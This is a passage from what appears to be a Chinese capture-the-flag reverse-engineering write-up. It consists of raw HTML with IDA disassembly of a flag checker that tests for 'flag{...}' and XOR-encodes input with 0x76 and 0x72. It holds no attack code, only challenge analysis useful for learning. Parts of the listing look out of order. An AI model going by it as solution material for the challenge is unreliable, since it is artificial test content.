class="hljs-built_in">rax</span>, <span class="hljs-built_in">rsi</span><br><span class="hljs-symbol">.text:</span>000000000000147F                 <span class="hljs-keyword">sub</span>     <span class="hljs-built_in">rsi</span>, <span class="hljs-number">1</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001483</span>                 <span class="hljs-keyword">cmp</span>     <span class="hljs-built_in">rdi</span>, <span class="hljs-number">2</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001487</span>                 <span class="hljs-keyword">jnz</span>     short loc_145F<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001489</span>                 <span class="hljs-keyword">mov</span>     [<span class="hljs-built_in">r8</span>+<span class="hljs-number">0A8h</span>], <span class="hljs-built_in">rax</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001490</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001490</span> locret_1490:                            <span class="hljs-comment">; CODE XREF: .text:0000000000001424↑j</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001490</span>                                         <span class="hljs-comment">; .text:0000000000001430↑j ...</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001490</span>                 <span class="hljs-keyword">retn</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001490</span> <span class="hljs-comment">; ---------------------------------------------------------------------------</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001491</span>                 <span class="hljs-meta">align</span> <span class="hljs-number">20h</span><br><span class="hljs-symbol">.text:</span>00000000000014A0 <span class="hljs-comment">; [00000001 BYTES: COLLAPSED FUNCTION nullsub_1. PRESS CTRL-NUMPAD+ TO EXPAND]</span><br><span class="hljs-symbol">.text:</span>00000000000014A1 <span class="hljs-comment">; ---------------------------------------------------------------------------</span><br><span class="hljs-symbol">.text:</span>00000000000014A1                 <span class="hljs-keyword">pop</span>     <span class="hljs-built_in">rbp</span><br><span class="hljs-symbol">.text:</span>00000000000014A2                 <span class="hljs-keyword">pop</span>     <span class="hljs-built_in">rbx</span><br><span class="hljs-symbol">.text:</span>00000000000014A3                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">eax</span>, <span class="hljs-built_in">ebp</span><br><span class="hljs-symbol">.text:</span>00000000000014A5                 <span class="hljs-keyword">add</span>     <span class="hljs-built_in">rsp</span>, <span class="hljs-number">8</span><br><span class="hljs-symbol">.text:</span>00000000000014A9                 <span class="hljs-keyword">xor</span>     <span class="hljs-built_in">ebp</span>, <span class="hljs-built_in">ebp</span><br><span class="hljs-symbol">.text:</span>00000000000014AB                 <span class="hljs-keyword">retn</span><br><span class="hljs-symbol">.text:</span>00000000000014AC <span class="hljs-comment">; ---------------------------------------------------------------------------</span><br><span class="hljs-symbol">.text:</span>00000000000014AC<br><span class="hljs-symbol">.text:</span>00000000000014AC loc_14AC:                               <span class="hljs-comment">; CODE XREF: .text:00000000000014EC↓j</span><br><span class="hljs-symbol">.text:</span>00000000000014AC                 <span class="hljs-keyword">pop</span>     <span class="hljs-built_in">rbp</span><br><span class="hljs-symbol">.text:</span>00000000000014AD                 <span class="hljs-keyword">pop</span>     <span class="hljs-built_in">rbx</span><br><span class="hljs-symbol">.text:</span>00000000000014AE                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">eax</span>, <span class="hljs-built_in">ebp</span><br><span class="hljs-symbol">.text:</span>00000000000014B0                 <span class="hljs-keyword">add</span>     <span class="hljs-built_in">rsp</span>, <span class="hljs-number">8</span><br><span class="hljs-symbol">.text:</span>00000000000014B4                 <span class="hljs-keyword">setz</span>    <span class="hljs-built_in">bpl</span><br><span class="hljs-symbol">.text:</span>00000000000014B8<br><span class="hljs-symbol">.text:</span>00000000000014B8 loc_14B8:                               <span class="hljs-comment">; CODE XREF: .text:00000000000014BC↓j</span><br><span class="hljs-symbol">.text:</span>00000000000014B8                                         <span class="hljs-comment">; .text:00000000000014CA↓j ...</span><br><span class="hljs-symbol">.text:</span>00000000000014B8                 <span class="hljs-keyword">cmp</span>     <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rbx</span>+<span class="hljs-number">17h</span>], <span class="hljs-number">7Dh</span> <span class="hljs-comment">; &#x27;&#125;&#x27;</span><br><span class="hljs-symbol">.text:</span>00000000000014BC                 <span class="hljs-keyword">jnz</span>     short loc_14B8<br><span class="hljs-symbol">.text:</span>00000000000014BE                 <span class="hljs-keyword">cmp</span>     <span class="hljs-built_in">eax</span>, <span class="hljs-number">17h</span><br><span class="hljs-symbol">.text:</span>00000000000014C1                 <span class="hljs-keyword">call</span>    _strlen<br><span class="hljs-symbol">.text:</span>00000000000014C6                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">rdi</span>, [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">1</span>]<br><span class="hljs-symbol">.text:</span>00000000000014CA                 <span class="hljs-keyword">jnz</span>     short loc_14B8<br><span class="hljs-symbol">.text:</span>00000000000014CC                 <span class="hljs-keyword">cmp</span>     <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">4</span>], <span class="hljs-number">7Bh</span> <span class="hljs-comment">; &#x27;&#123;&#x27;</span><br><span class="hljs-symbol">.text:</span>00000000000014D0                 <span class="hljs-keyword">jnz</span>     short loc_14B8<br><span class="hljs-symbol">.text:</span>00000000000014D2                 <span class="hljs-keyword">cmp</span>     <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">3</span>], <span class="hljs-number">67h</span> <span class="hljs-comment">; &#x27;g&#x27;</span><br><span class="hljs-symbol">.text:</span>00000000000014D6                 <span class="hljs-keyword">jnz</span>     short loc_14B8<br><span class="hljs-symbol">.text:</span>00000000000014D8                 <span class="hljs-keyword">cmp</span>     <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">2</span>], <span class="hljs-number">61h</span> <span class="hljs-comment">; &#x27;a&#x27;</span><br><span class="hljs-symbol">.text:</span>00000000000014DC                 <span class="hljs-keyword">jnz</span>     short loc_14B8<br><span class="hljs-symbol">.text:</span>00000000000014DE                 <span class="hljs-keyword">cmp</span>     <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">1</span>], <span class="hljs-number">6Ch</span> <span class="hljs-comment">; &#x27;l&#x27;</span><br><span class="hljs-symbol">.text:</span>00000000000014E2                 <span class="hljs-keyword">jnz</span>     short loc_14B8<br><span class="hljs-symbol">.text:</span>00000000000014E4                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rbx</span>, <span class="hljs-built_in">rdi</span><br><span class="hljs-symbol">.text:</span>00000000000014E7                 <span class="hljs-keyword">cmp</span>     <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rdi</span>], <span class="hljs-number">66h</span> <span class="hljs-comment">; &#x27;f&#x27;</span><br><span class="hljs-symbol">.text:</span>00000000000014EA                 <span class="hljs-keyword">xor</span>     <span class="hljs-built_in">ebp</span>, <span class="hljs-built_in">ebp</span><br><span class="hljs-symbol">.text:</span>00000000000014EC                 <span class="hljs-keyword">jz</span>      short loc_14AC<br><span class="hljs-symbol">.text:</span>00000000000014EE                 <span class="hljs-keyword">test</span>    <span class="hljs-built_in">rdi</span>, <span class="hljs-built_in">rdi</span><br><span class="hljs-symbol">.text:</span>00000000000014F1                 <span class="hljs-keyword">sub</span>     <span class="hljs-built_in">rsp</span>, <span class="hljs-number">8</span><br><span class="hljs-symbol">.text:</span>00000000000014F5                 <span class="hljs-keyword">push</span>    <span class="hljs-built_in">rbx</span><br><span class="hljs-symbol">.text:</span>00000000000014F6                 <span class="hljs-keyword">push</span>    <span class="hljs-built_in">rbp</span><br><span class="hljs-symbol">.text:</span>00000000000014F7                 <span class="hljs-keyword">vfnmadd213sd</span> <span class="hljs-built_in">xmm7</span>, <span class="hljs-built_in">xmm0</span>, <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rsp</span>+<span class="hljs-number">28h</span>]<br></code></pre></td></tr></table></figure><h4 id="主要加密"><a href="#主要加密" class="headerlink" title="主要加密"></a>主要加密</h4><p>这部分可以看到有很多异或操作，并且是多次异或同一个值，一个 <strong>0x76</strong> ,一个 <strong>0x72</strong></p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-symbol">.text:</span>00000000000015BC loc_15BC:                               <span class="hljs-comment">; CODE XREF: .text:loc_1865↓j</span><br><span class="hljs-symbol">.text:</span>00000000000015BC                 <span class="hljs-keyword">pop</span>     <span class="hljs-built_in">r15</span><br><span class="hljs-symbol">.text:</span>00000000000015BE                 <span class="hljs-keyword">pop</span>     <span class="hljs-built_in">r14</span><br><span class="hljs-symbol">.text:</span>00000000000015C0                 <span class="hljs-keyword">pop</span>     <span class="hljs-built_in">r13</span><br><span class="hljs-symbol">.text:</span>00000000000015C2                 <span class="hljs-keyword">pop</span>     <span class="hljs-built_in">r12</span><br><span class="hljs-symbol">.text:</span>00000000000015C4                 <span class="hljs-keyword">pop</span>     <span class="hljs-built_in">rbp</span><br><span class="hljs-symbol">.text:</span>00000000000015C5                 <span class="hljs-keyword">pop</span>     <span class="hljs-built_in">rbx</span><br><span class="hljs-symbol">.text:</span>00000000000015C6                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rax</span>, <span class="hljs-built_in">rcx</span><br><span class="hljs-symbol">.text:</span>00000000000015C9                 <span class="hljs-keyword">add</span>     <span class="hljs-built_in">rsp</span>, <span class="hljs-number">8</span><br><span class="hljs-symbol">.text:</span>00000000000015CD                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rcx</span>+<span class="hljs-built_in">rbp</span>], <span class="hljs-number">0</span><br><span class="hljs-symbol">.text:</span>00000000000015D1<br><span class="hljs-symbol">.text:</span>00000000000015D1 loc_15D1:                               <span class="hljs-comment">; CODE XREF: .text:0000000000001593↑j</span><br><span class="hljs-symbol">.text:</span>00000000000015D1                 <span class="hljs-keyword">movsxd</span>  <span class="hljs-built_in">rbp</span>, <span class="hljs-built_in">ebp</span><br><span class="hljs-symbol">.text:</span>00000000000015D4                 <span class="hljs-keyword">mov</span>     [<span class="hljs-built_in">rcx</span>+<span class="hljs-built_in">rax</span>], <span class="hljs-built_in">dl</span><br><span class="hljs-symbol">.text:</span>00000000000015D7<br><span class="hljs-symbol">.text:</span>00000000000015D7 loc_15D7:                               <span class="hljs-comment">; CODE XREF: .text:00000000000015E1↓j</span><br><span class="hljs-symbol">.text:</span>00000000000015D7                                         <span class="hljs-comment">; .text:00000000000015F7↓j ...</span><br><span class="hljs-symbol">.text:</span>00000000000015D7                 <span class="hljs-keyword">xor</span>     <span class="hljs-built_in">edx</span>, <span class="hljs-number">76h</span><br><span class="hljs-symbol">.text:</span>00000000000015DA                 <span class="hljs-keyword">movzx</span>   <span class="hljs-built_in">edx</span>, <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">r12</span>+<span class="hljs-built_in">rax</span>]<br><span class="hljs-symbol">.text:</span>00000000000015DF                 <span class="hljs-keyword">cdqe</span><br><span class="hljs-symbol">.text:</span>00000000000015E1                 <span class="hljs-keyword">jle</span>     short loc_15D7<br><span class="hljs-symbol">.text:</span>00000000000015E3                 <span class="hljs-keyword">cmp</span>     <span class="hljs-built_in">ebp</span>, <span class="hljs-built_in">eax</span><br><span class="hljs-symbol">.text:</span>00000000000015E5                 <span class="hljs-keyword">mov</span>     [<span class="hljs-built_in">rcx</span>+<span class="hljs-built_in">rdx</span>], <span class="hljs-built_in">sil</span><br><span class="hljs-symbol">.text:</span>00000000000015E9                 <span class="hljs-keyword">xor</span>     <span class="hljs-built_in">esi</span>, <span class="hljs-number">76h</span><br><span class="hljs-symbol">.text:</span>00000000000015EC                 <span class="hljs-keyword">movzx</span>   <span class="hljs-built_in">esi</span>, <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">r12</span>+<span class="hljs-built_in">rdx</span>]<br><span class="hljs-symbol">.text:</span>00000000000015F1                 <span class="hljs-keyword">add</span>     <span class="hljs-built_in">eax</span>, <span class="hljs-number">6</span><br><span class="hljs-symbol">.text:</span>00000000000015F4                 <span class="hljs-keyword">movsxd</span>  <span class="hljs-built_in">rdx</span>, <span class="hljs-built_in">edx</span><br><span class="hljs-symbol">.text:</span>00000000000015F7                 <span class="hljs-keyword">jle</span>     short loc_15D7<br><span class="hljs-symbol">.text:</span>00000000000015F9                 <span class="hljs-keyword">cmp</span>     <span class="hljs-built_in">ebp</span>, <span class="hljs-built_in">edx</span><br><span class="hljs-symbol">.text:</span>00000000000015FB                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">edx</span>, [<span class="hljs-built_in">rax</span>+<span class="hljs-number">5</span>]<br><span class="hljs-symbol">.text:</span>00000000000015FE                 <span class="hljs-keyword">mov</span>     [<span class="hljs-built_in">rcx</span>+<span class="hljs-built_in">rdx</span>], <span class="hljs-built_in">sil</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001602</span>                 <span class="hljs-keyword">xor</span>     <span class="hljs-built_in">esi</span>, <span class="hljs-number">76h</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001605</span>                 <span class="hljs-keyword">movzx</span>   <span class="hljs-built_in">esi</span>, <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">r12</span>+<span class="hljs-built_in">rdx</span>]<br><span class="hljs-symbol">.text:</span>000000000000160A                 <span class="hljs-keyword">movsxd</span>  <span class="hljs-built_in">rdx</span>, <span class="hljs-built_in">edx</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">000000000000160D</span>                 <span class="hljs-keyword">jle</span>     short loc_15D7<br><span class="hljs-symbol">.text:</span>000000000000160F                 <span class="hljs-keyword">cmp</span>     <span class="hljs-built_in">ebp</span>, <span class="hljs-built_in">edx</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001611</span>                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">edx</span>, [<span class="hljs-built_in">rax</span>+<span class="hljs-number">4</span>]<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001614</span>                 <span class="hljs-keyword">mov</span>     [<span class="hljs-built_in">rcx</span>+<span class="hljs-built_in">rdx</span>], <span class="hljs-built_in">sil</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001618</span>                 <span class="hljs-keyword">xor</span>     <span class="hljs-built_in">esi</span>, <span class="hljs-number">76h</span><br><span class="hljs-symbol">.text:</span>000000000000161B                 <span class="hljs-keyword">movzx</span>   <span class="hljs-built_in">esi</span>, <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">r12</span>+<span class="hljs-built_in">rdx</span>]<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001620</span>                 <span class="hljs-keyword">movsxd</span>  <span class="hljs-built_in">rdx</span>, <span class="hljs-built_in">edx</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001623</span>                 <span class="hljs-keyword">jge</span>     short loc_15D7<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001625</span>                 <span class="hljs-keyword">cmp</span>     <span class="hljs-built_in">edx</span>, <span class="hljs-built_in">ebp</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001627</span>                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">edx</span>, [<span class="hljs-built_in">rax</span>+<span class="hljs-number">3</span>]<br><span class="hljs-symbol">.text:</span>000000000000162A                 <span class="hljs-keyword">mov</span>     [<span class="hljs-built_in">rcx</span>+<span class="hljs-built_in">rdx</span>], <span class="hljs-built_in">sil</span><br><span class="hljs-symbol">.text:</span>000000000000162E                 <span class="hljs-keyword">xor</span>     <span class="hljs-built_in">esi</span>, <span class="hljs-number">76h</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001631</span>                 <span class="hljs-keyword">movzx</span>   <span class="hljs-built_in">esi</span>, <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">r12</span>+<span class="hljs-built_in">rdx</span>]<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001636</span>                 <span class="hljs-keyword">movsxd</span>  <span class="hljs-built_in">rdx</span>, <span class="hljs-built_in">edx</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001639</span>                 <span class="hljs-keyword">jge</span>     short loc_15D7<br><span class="hljs-symbol">.text:</span>000000000000163B                 <span class="hljs-keyword">cmp</span>     <span class="hljs-built_in">edx</span>, <span class="hljs-built_in">ebp</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">000000000000163D</span>                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">edx</span>, [<span class="hljs-built_in">rax</span>+<span class="hljs-number">2</span>]<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001640</span>                 <span class="hljs-keyword">mov</span>     [<span class="hljs-built_in">rcx</span>+<span class="hljs-built_in">rdx</span>], <span class="hljs-built_in">sil</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001644</span>                 <span class="hljs-keyword">xor</span>     <span class="hljs-built_in">esi</span>, <span class="hljs-number">76h</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001647</span>                 <span class="hljs-keyword">movzx</span>   <span class="hljs-built_in">esi</span>, <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">r12</span>+<span class="hljs-built_in">rdx</span>]<br><span class="hljs-symbol">.text:</span>000000000000164C                 <span class="hljs-keyword">movsxd</span>  <span class="hljs-built_in">rdx</span>, <span class="hljs-built_in">edx</span><br><span class="hljs-symbol">.text:</span>000000000000164F                 <span class="hljs-keyword">jle</span>     short loc_15D7<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001651</span>                 <span class="hljs-keyword">cmp</span>     <span class="hljs-built_in">ebp</span>, <span class="hljs-built_in">edx</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001653</span>                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">edx</span>, [<span class="hljs-built_in">rax</span>+<span class="hljs-number">1</span>]<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001656</span>                 <span class="hljs-keyword">mov</span>     [<span class="hljs-built_in">rcx</span>+<span class="hljs-built_in">rsi</span>], <span class="hljs-built_in">dl</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001659</span>                 <span class="hljs-keyword">xor</span>     <span class="hljs-built_in">edx</span>, <span class="hljs-number">76h</span><br><span class="hljs-symbol">.text:</span>000000000000165C                 <span class="hljs-keyword">movzx</span>   <span class="hljs-built_in">edx</span>, <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">r12</span>+<span class="hljs-built_in">rsi</span>]<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001661</span>                 <span class="hljs-keyword">movsxd</span>  <span class="hljs-built_in">rsi</span>, <span class="hljs-built_in">eax</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001664</span>                 <span class="hljs-keyword">jz</span>      loc_15D7<br><span class="hljs-symbol">.text:</span>000000000000166A<br><span class="hljs-symbol">.text:</span>000000000000166A loc_166A:                               <span class="hljs-comment">; CODE XREF: .text:000000000000168B↓j</span><br><span class="hljs-symbol">.text:</span>000000000000166A                 <span class="hljs-keyword">and</span>     <span class="hljs-built_in">esi</span>, <span class="hljs-number">7</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">000000000000166D</span>                 <span class="hljs-keyword">add</span>     <span class="hljs-built_in">eax</span>, <span class="hljs-built_in">edx</span><br><span class="hljs-symbol">.text:</span>000000000000166F                 <span class="hljs-keyword">and</span>     <span class="hljs-built_in">edx</span>, <span class="hljs-number">0FFFFFFF8h</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001672</span>                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">edx</span>, <span class="hljs-built_in">esi</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001674</span>                 <span class="hljs-keyword">movq</span>    <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rcx</span>+<span class="hljs-built_in">rdx</span>], <span class="hljs-built_in">xmm0</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001679</span>                 <span class="hljs-keyword">pxor</span>    <span class="hljs-built_in">xmm0</span>, <span class="hljs-built_in">xmm1</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">000000000000167D</span>                 <span class="hljs-keyword">movq</span>    <span class="hljs-built_in">xmm0</span>, <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">r12</span>+<span class="hljs-built_in">rdx</span>]<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001683</span>                 <span class="hljs-keyword">movq</span>    <span class="hljs-built_in">xmm1</span>, <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">cs</span>:xmmword_2160<br><span class="hljs-symbol">.text:</span>000000000000168B                 <span class="hljs-keyword">jbe</span>     short loc_166A<br><span class="hljs-symbol">.text:</span><span class="hljs-number">000000000000168D</span>                 <span class="hljs-keyword">cmp</span>     <span class="hljs-built_in">edi</span>, <span class="hljs-number">6</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001690</span>                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">edi</span>, [<span class="hljs-built_in">rsi</span>-<span class="hljs-number">1</span>]<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001693</span>                 <span class="hljs-keyword">sub</span>     <span class="hljs-built_in">esi</span>, <span class="hljs-built_in">edx</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001695</span>                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">esi</span>, <span class="hljs-built_in">ebp</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000001697</span>                 <span class="hljs-keyword">jz</span>      loc_15D7<br><span class="hljs-symbol">.text:</span><span class="hljs-number">000000000000169D</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">000000000000169D</span> loc_169D:                               <span class="hljs-comment">; CODE XREF: .text:0000000000001597↑j</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">000000000000169D</span>                 <span class="hljs-keyword">cmp</span>     <span class="hljs-built_in">eax</span>, <span class="hljs-built_in">ebp</span><br><span class="hljs-symbol">.text:</span>000000000000169F                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">edx</span>, <span class="hljs-built_in">eax</span><br><span class="hljs-symbol">.text:</span>00000000000016A1                 <span class="hljs-keyword">and</span>     <span class="hljs-built_in">eax</span>, <span class="hljs-number">0FFFFFFF0h</span><br><span class="hljs-symbol">.text:</span>00000000000016A4                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">eax</span>, <span class="hljs-built_in">ebp</span><br><span class="hljs-symbol">.text:</span>00000000000016A6                 <span class="hljs-keyword">jnz</span>     short loc_16C1<br><span class="hljs-symbol">.text:</span>00000000000016A8                 <span class="hljs-keyword">cmp</span>     <span class="hljs-built_in">rdx</span>, <span class="hljs-built_in">rax</span><br><span class="hljs-symbol">.text:</span>00000000000016AB                 <span class="hljs-keyword">add</span>     <span class="hljs-built_in">rax</span>, <span class="hljs-number">10h</span><br><span class="hljs-symbol">.text:</span>00000000000016AF                 <span class="hljs-keyword">movups</span>  xmmword <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rcx</span>+<span class="hljs-built_in">rax</span>], <span class="hljs-built_in">xmm0</span><br><span class="hljs-symbol">.text:</span>00000000000016B3                 <span class="hljs-keyword">pxor</span>    <span class="hljs-built_in">xmm0</span>, <span class="hljs-built_in">xmm1</span><br><span class="hljs-symbol">.text:</span>00000000000016B7                 <span class="hljs-keyword">movdqu</span>  <span class="hljs-built_in">xmm0</span>, xmmword <span class="hljs-built_in">ptr</span> [<span 